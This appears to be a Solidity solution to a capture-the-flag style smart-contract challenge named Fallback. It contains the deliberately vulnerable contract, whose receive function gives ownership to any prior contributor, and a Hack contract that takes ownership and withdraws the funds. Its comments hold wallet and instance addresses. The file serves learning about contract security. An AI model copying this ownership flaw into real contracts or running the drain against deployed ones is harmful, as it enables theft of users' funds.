// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner  {
    uint256 contractBalance = address(this).balance;
    payable(owner).transfer(contractBalance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

contract Hack {
  Fallback f;

  constructor(address payable _address) {
    f = Fallback(_address);
  }

  function contribute() external payable {
    f.contribute{value : msg.value}();
  }

  function callReceive() external payable {
    (bool success, ) = address(f).call{value : msg.value}("");
    require(success);
  }

  function withdraw() external {
    f.withdraw();
  }

}

// assignment :
// 1. caling the fallback function
// 2. ether transfer into another contract

// use ethereum 


// instance : 0xB454424BfD7f44f6D5d82ED820686F8FDe9D2F45

// metamask : address 3:  0x33B9B6Eb32Ac28933e8653E6F31B99ddC6012F37
// 0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB
